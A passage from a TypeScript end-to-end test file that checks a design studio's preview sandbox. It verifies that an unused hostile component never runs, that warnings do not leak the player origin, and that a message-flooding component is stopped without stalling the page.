    const at = segFrame(view, 'c1');
    // Recording the hostile component's reports: this plan does not use it, so its module must never run (B3).
    await openPreview(page, frame_url, plan_url, at, true);
    await until('settled', async () => (await msgs(page)).some((m) => m.type === 'settled' && m.frame === at));
    expect(await reports(page)).toEqual([]);
    const warning = (await msgs(page)).find((m) => m.type === 'warning');
    expect(warning?.message).toMatch(/a theme font could not be loaded \(.*\): the preview uses a fallback font/);
    expect(String(warning?.message)).not.toContain(studio.player.origin);
    expect(await previewFrame(page).evaluate(() => document.body.innerText)).toContain('Card c1');
    const lottie = segFrame(view, 'c2');
    await page.evaluate((f) => (window as unknown as { __conn: { send(m: unknown): boolean } }).__conn.send({ type: 'seek', frame: f }), lottie);
    await until('settled on the Lottie card', async () => (await msgs(page)).some((m) => m.type === 'settled' && m.frame === lottie));
    expect(await previewFrame(page).evaluate(() => document.querySelectorAll('svg path').length)).toBeGreaterThan(3);
    expect((await msgs(page)).filter((m) => m.type === 'error')).toEqual([]);
    await page.context().close();
  }, 120_000);

  it('⚑ a flooding component: the page never stalls, the preview stops', async () => {
    const { view, frame_url, plan_url } = await published('fl');
    const page = await studioPage();
    await openPreview(page, frame_url, plan_url, segFrame(view, 'c1'), false);
    await until('loaded', async () => (await msgs(page)).find((m) => m.type === 'loaded'));
    const gaps = () => page.evaluate(() => {
      const w = window as unknown as { __gaps: number[]; __stopped: string | null };
      const gap = Math.max(0, ...w.__gaps);
      w.__gaps = [];
      return { gap, stopped: w.__stopped, frames: document.querySelectorAll('iframe').length };
    });
    await gaps();
    // 100,000 messages on window: no listener of the page sees them; the preview goes on.
    await new Promise((r) => setTimeout(r, 2500));
    const free = await gaps();
    expect(free).toMatchObject({ stopped: null, frames: 1 });
    expect(free.gap).toBeLessThan(200);
    // 100,000 on the port the component stole: the budget stops the preview.
    const stopped = await until('stopped', () => page.evaluate(() => (window as unknown as { __stopped: string | null }).__stopped ?? undefined), 30_000);
    expect(stopped).toBe(STOP_FLOOD);
    await new Promise((r) => setTimeout(r, 1500));
    const after = await gaps();
    expect(after.frames).toBe(0);
    expect(Math.max(after.gap, (await gaps()).gap)).toBeLessThan(200);
    await page.context().close();
  }, 120_000);
});
